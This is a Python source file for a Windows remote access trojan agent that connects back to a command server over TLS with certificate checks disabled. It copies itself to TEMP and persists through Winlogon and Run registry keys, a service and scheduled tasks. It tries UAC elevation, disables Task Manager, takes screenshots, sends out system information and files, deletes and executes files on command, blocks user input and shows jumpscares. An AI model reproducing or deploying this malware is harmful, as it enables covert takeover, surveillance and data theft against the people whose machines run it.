import socket
import platform
import time
import sys
import subprocess
from pygame import mixer
import threading
from PIL import ImageGrab
import filetrans
import io
import shutil
import tkinter
from PIL import Image, ImageTk
import webbrowser
import wmi
import ctypes
#from RemoteDesktop import RDC
from CamUtils import CameraAgent
from NetScan import NetworkScannerAgent
from windows_toasts import Toast, WindowsToaster
import Info_enum
from win32com.shell import shell
import win32con, win32api
import os
import ssl
from base64 import b64encode
from dataser import serialize
from filetrans import send_single_file, receive_single_file
from pynput import keyboard as kb
from pynput import mouse

_wmi = wmi.WMI()
os_name = _wmi.Win32_OperatingSystem()[0].Name.split("|")[0]
PORT = 6978
IP = socket.gethostbyname(socket.gethostname())
FILE_PORT = 9999
blocking_input = False
isadmin = None
#rdp_client = RDC(IP)
cam_client = CameraAgent(IP, 7000)
netscan = NetworkScannerAgent(IP)
_self_path = ""

if shell.IsUserAnAdmin():
    isadmin = True
else:
    isadmin = False

def get_devices():
    wql = "Select * From Win32_USBControllerDevice"
    devices = ""
    for item in _wmi.query(wql):
        devices += f"{item.Dependent.Name}:{item.Dependent.PNPClass}:{item.Dependent.Status}|"
    return devices[0:-1]

def block_input(state: bool):
    mouse_event = mouse.Listener(suppress=True)
    kb_event = kb.Listener(suppress=True)
    if state:
        mouse_event.start()
        kb_event.start()
    else:
        mouse_event.stop()
        kb_event.stop()

def jumpscare(sound, picture):
    mixer.init()
    mixer.music.load(sound)
    root = tkinter.Tk()
    root.attributes(fullscreen=True, topmost=True)
    f = open(picture, "rb")
    image_bytes = f.read()
    f.close()
    image = Image.open(io.BytesIO(image_bytes))
    y, x = root.winfo_screenheight(), root.winfo_screenwidth()
    image = image.resize((x, y))
    display = ImageTk.PhotoImage(image)
    image_label = tkinter.Label(root, image=display)
    image_label.pack(fill="both", expand=True)
    mixer.music.play()
    while True:
        if not mixer.music.get_busy():
            mixer.quit()
            image.close()
            os.remove(picture)
            os.remove(sound)
            root.destroy()
            break
        root.update()

def file_client():
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        print("File Client Started")
        sock = socket.socket()
        sock = context.wrap_socket(sock, server_hostname=IP, do_handshake_on_connect=True)
        sock.connect((IP, FILE_PORT))
        print("Connected Successfully")
        while True:
            data = sock.recv(1024).decode()
            print(data)

            if data.startswith("dir"):
                try:
                    flag, target_dir = data.split(":", maxsplit=1)
                    if target_dir == "home":
                        target_dir = os.path.expanduser("~")
                    
                    # ── Serialize and encode with explicit utf-8 so Arabic names survive ──
                    serialized = serialize(target_dir)
                    encoded = b64encode(serialized.encode("utf-8"))
                    size_bytes = str(len(encoded)).encode()

                    sock.send(b"DIR")
                    sock.send(size_bytes)          # send size so C2 knows exactly how much to read
                    sock.send(target_dir.encode())          
                    sock.sendall(encoded)          # send actual data
                except Exception as e:
                    print(f"Dir send error: {e}")
                    sock.send(f"Error: {e}".encode())

            if data.startswith("del"):
                try:
                    flag, path = data.split(":", maxsplit=1)
                    if os.path.isdir(path):
                        os.system(f"rmdir {path} /S /Q")
                    if not os.path.isdir(path):
                        os.system(f"del /f /q {path}")

                except Exception as p:
                    print(p)

            if data.startswith("upload"):
                try:
                    flag, path = data.split(":", maxsplit=1)
                    receive_single_file(sock, path)
                    print("Success")
                except Exception as fe:
                    print(f"Upload Error: {fe}")

            if data.startswith("file_down"):
                try:
                    _flag, target_file = data.split(":", maxsplit=1)
                    if not os.path.isdir(target_file):
                        try:
                            with open(target_file, "rb") as f:
                                pass
                            sock.send("receive".encode())
                            send_single_file(sock, target_file)
                        except PermissionError:
                            sock.send(b"Error: Permission Denied!")
                except Exception as e:
                    sock.send(f"Error: {e}".encode())

            if data == "drives":
                drives = win32api.GetLogicalDriveStrings()
                sock.send(f"drive|{drives}".encode())

            if data.startswith("execute"):
                try:
                    flag, path = data.split(":", maxsplit=1)
                    def procc():
                        try:
                            os.startfile(path)
                            sock.send(b"exec_success")
                        except Exception as e:
                            sock.send(f"Execution Error: {e}".encode())
                    threading.Thread(target=procc).start()
                except Exception as fe:
                    sock.send(f"Error: {fe}".encode())

            if data == "close":
                sock.close()
                break
    except Exception as fe:
        print(f"File Explorer Error: {fe}")

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format="PNG")
    return screenshot_bytes.getvalue()

def ScreenOFF():
    return win32api.PostMessage(win32con.HWND_BROADCAST,
                                win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)

def ScreenON():
    return win32api.PostMessage(win32con.HWND_BROADCAST,
                                win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)

def play_sound(file):
    try:
        mixer.init()
        mixer.music.load(file)
        mixer.music.play()
        while True:
            if not mixer.music.get_busy():
                mixer.music.unload()
                os.remove(file)
                break
    except Exception as e:
        print(f"Player Error: {e}")

def self_copy():
    global _self_path
    agent_name = os.path.basename(sys.executable)
    temp = os.getenv("TEMP")
    shutil.copy(sys.executable, temp)
    _self_path = os.path.join(temp, agent_name)

def get_hwid():
    for board in _wmi.Win32_ComputerSystemProduct():
        return f"{board.Name}|{board.UUID}"

def self_persist():
    if isadmin == False:
        key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
        command = f'reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /f /t REG_SZ /d "{_self_path}, explorer"'
        return_code = os.system(command)
        print(return_code)
        if return_code == 0:
            print("Persistance Completed")
            return True
        if return_code != 0:
            print("Persistance Ran Into a Problem")
            return False
        return None
    elif True:
        command = f'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /d \"Windows Dynamic Link Library Service\" /v {os.getenv("TEMP") + "\\" + os.path.basename(sys.executable)} {sys.argv}'
        #proc = subprocess.run(f'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /d \"Windows Dynamic Link Library Service\" /v {os.getenv("TEMP") + "\\" + os.path.basename(sys.executable)} {sys.argv}')
        proc = subprocess.run(f"sc create \"MyNewService\" binPath= \"\\\"{sys.executable}\" start= auto")
        #print(winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"))

def elivate(s):
    try:
        if shell.IsUserAnAdmin():
            s.send("admin".encode())
        else:
            e = shell.ShellExecuteEx(lpVerb="runas", lpFile=sys.executable, lpParameters=" ".join(sys.argv))
            if type(e) == dict:
                s.send("privesc".encode())
                os._exit(0)
    except Exception:
        pass

get_hwid()

def start_agent(s: socket.socket):
    self_copy()
    print("CONNECTED")
    if not isadmin:
        s.send(f"{socket.gethostbyname(socket.gethostname())}|{os.getenv('USERNAME')}@{socket.gethostname()}|{os_name}|{platform.version()}|User|{get_hwid()}".encode())
    else:
        s.send(f"{socket.gethostbyname(socket.gethostname())}|{os.getenv('USERNAME')}@{socket.gethostname()}|{os_name}|{platform.version()}|Admin|{get_hwid()}".encode())
    code = self_persist()
    if code == True:
        pass
    if code == False:
        s.sendall(b"persist_f")
    while True:
        try:
            data = s.recv(1024).decode()
            print(data)
            if not data:
                break

            if data == "ping":
                s.sendall("ping successful".encode())

            if data.startswith("url"):
                flag, url = data.split(":", maxsplit=1)
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = f"https://{url}"
                webbrowser.open(url)

            if data == "disconnect":
                os._exit(0)

            if data == "ss":
                s.sendall(b"ss")
                screenshot_bytes = take_screenshot()
                screenshot_size = len(screenshot_bytes)
                time.sleep(0.5)
                s.send(str(screenshot_size).encode())
                time.sleep(0.5)
                sent_bytes = 0
                while sent_bytes < screenshot_size:
                    chunk = screenshot_bytes[sent_bytes: sent_bytes + 1024]
                    s.send(chunk)
                    sent_bytes += len(chunk)
             
            if data == "start_rdp":
                rdp_client.start()
            
            if data == "start_cam":
                cam_client.start()

            if data.startswith("jumpscare"):
                try:
                    flag, image, sound = data.split("|")
                    temp = os.getenv("TEMP")
                    receive_single_file(s, temp)
                    receive_single_file(s, temp)
                    jumpscare(os.path.join(temp, sound), os.path.join(temp, image))
                    s.send(b"Success jumpscare")
                except Exception as je:
                    print(je)

            if data == "info":
                try:
                    #s.send("infostart".encode())
                    temp = os.getenv("TEMP")
                    os.chdir(temp)
                    Info_enum.main()
                    s.send(b"info_success")
                    filetrans.send_single_file(s, "windows_system_info.txt")
                    filetrans.send_single_file(s, "windows_system_info.json")
                    os.remove("windows_system_info.txt")
                    os.remove("windows_system_info.json")
                except Exception as e:
                    s.sendall(f"Error: {e}".encode())

            if data == "get_devs":
                devices = get_devices()
                s.sendall(f"DEV@{devices}".encode())

            if data == "start_file":
                threading.Thread(target=file_client).start()

            if data == "mon_off":
                ScreenOFF()

            if data == "mon_on":
                ScreenON()

            if data.startswith("sound"):
                try:
                    flag, _file = data.split(":")
                    receive_single_file(s, os.getenv("TEMP") + "\\")
                    threading.Thread(target=lambda: play_sound(os.getenv("TEMP") + "\\" + _file), daemon=True).start()
                    s.send("Done!. Sound has been Played Successfully".encode())
                except Exception as e:
                    print(f"PLAY ERROR: {e}")

            if data.startswith("PSTANT"):
                flag, Tname, Trun, User = data.split("|")
                if Trun == "exec":
                    proc = subprocess.run(["schtasks", "/create", "/RL", "HIGHEST", "/TN", Tname,
                                           "/TR", os.getenv("TEMP") + "\\" + os.path.basename(sys.executable),
                                           "/RU", User, "/SC", "ONLOGON"], capture_output=True, text=True)
                else:
                    proc = subprocess.run(["schtasks", "/create", "/RL", "HIGHEST", "/TN", Tname,
                                           "/TR", Trun, "/RU", User, "/SC", "ONLOGON"],
                                          capture_output=True, text=True)
                if proc.stdout.startswith("SUCCESS"):
                    s.send("schtsk_1".encode())
                else:
                    s.send(b"ERROR: Access is Denied.")

            if data == "privesc":
                elivate(s)

            if data == "start_net":
                netscan.start()

            if data == "tskmgr_dis":
                proc = subprocess.run(
                    r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f".split(" "),
                    capture_output=True, text=True)
                if proc.returncode == 0:
                    s.send(b"taskdis")

            if data == "tskmgr_en":
                proc = subprocess.run(
                    r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f".split(" "),
                    capture_output=True, text=True)
                if proc.returncode == 0:
                    s.send(b"tasken")

            if data == "block_input":
                block_input(True)

            if data == "unblock_input":
                block_input(False)

            if data.startswith("wallpaper"):
                try:
                    flag, name = data.split("|")
                    receive_single_file(s, os.getenv("TEMP"))
                    picture = os.getenv("TEMP") + "\\" + name
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, picture, 3)
                    s.send(b"Success. Wallpaper Changed Successfully")
                except Exception as we:
                    s.send(f"Error: {we}".encode())

            if data == "shutdown":
                os.system("shutdown /s /t 0")

            if data == "restart":
                os.system("shutdown /r")

        except Exception as e:
            print(e)
            connect()
            break
        except  KeyboardInterrupt:
            break

def connect():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            client_socket = context.wrap_socket(client_socket, server_hostname=IP, do_handshake_on_connect=True)
            print("[DEBUG] CONNECTING...")
            con = client_socket.connect_ex((IP, PORT))
            if con == 0:
                start_agent(client_socket)
            else:
                print("Reconnecting...")
                client_socket.close()
                time.sleep(2)
        except Exception as e:
            print(e)
            time.sleep(2)

connect()